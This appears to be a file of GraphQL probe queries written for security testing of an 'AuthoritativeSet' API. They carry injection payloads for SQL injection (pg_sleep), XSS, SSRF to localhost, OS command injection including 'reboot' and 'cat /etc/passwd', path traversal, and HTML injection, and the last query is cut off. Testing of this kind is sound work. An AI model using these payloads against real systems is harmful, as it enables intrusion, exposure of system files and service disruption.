query {
  AuthoritativeSet(id: "sql-injectable-id") {
    authorities {
      items {
        description {
          name
          sources # No direct arguments here, attempting blind SQLi via the ID itself.
        }
        systemEvents {
          logMessage # If logMessage content were used to construct a SQL query
        }
      }
    }
    # Speculative SQL injection into the 'name' field if it were used in a backend query.
    # No direct argument, so will attempt via a string argument that is missing on this specific field.
    name(input: "test'; SELECT pg_sleep(5); --")
  }
}

query {
  AuthoritativeSet(id: "xss-test-id") {
    name
    description
    annotations {
      body # If the body of an annotation is reflected unescaped.
    }
    # Attempting to inject XSS into a field like 'description' via an argument.
    # The schema doesn't define arguments for description, so this is speculative
    # for a vulnerable implementation where a string argument might be interpreted as HTML.
    description(content: "<script>alert('XSS by Description Argument')</script>")
  }
}

query {
  AuthoritativeSet(id: "ssrf-test-id") {
    links {
      id
      type
      description
      # Speculative: If 'source' or 'targets' resolve Linkable types and their IDs are used
      # to fetch data over a network without proper validation.
      # Since we can't directly supply a URL, we provide a value that *looks* like a URL
      # in the hope it gets processed. This is a common blind SSRF scenario.
      source {
        __typename
        ... on AccessPoint { # If Linkable types can resolve to AccessPoint
          id(url: "http://127.0.0.1/admin") # Attempt to inject URL as an ID parameter if it exists
        }
      }
    }
  }
}

query {
  AuthoritativeSet(id: "os-command-test-id") {
    systemEvents {
      timestamp
      logMessage # If logMessage content is passed to a shell command.
      # Speculative: if 'logMessage' or 'eventType' has an argument that executes commands.
      eventType(command: "reboot; ls -la /; ")
    }
    name (action: "'; sleep 5; cat /etc/passwd #") # Trying to inject into 'name' field query, hoping it's processed by a shell command
  }
}

query {
  AuthoritativeSet(id: "path-injection-test-id") {
    annotations {
      id
      type
      body
      # Speculative: If 'field' or 'by' are used to construct file paths.
      # No explicit argument for path, so creating one to test the vulnerability.
      field(filename: "../../../etc/passwd")
    }
    name(resource: "/var/www/html/secret.txt") # Another speculative attempt
  }
}

query {
  AuthoritativeSet(id: "html-injection-id") {
    name
    description
    # Speculative: If the 'description' field is rendered directly as HTML.
    # Attempting to inject HTML via a non-existent argument 'markdown'.
    description(markdown: "<h1>Injected Header</h1><img src=x onerror=alert('HTML Injection Successful!')>")
  }
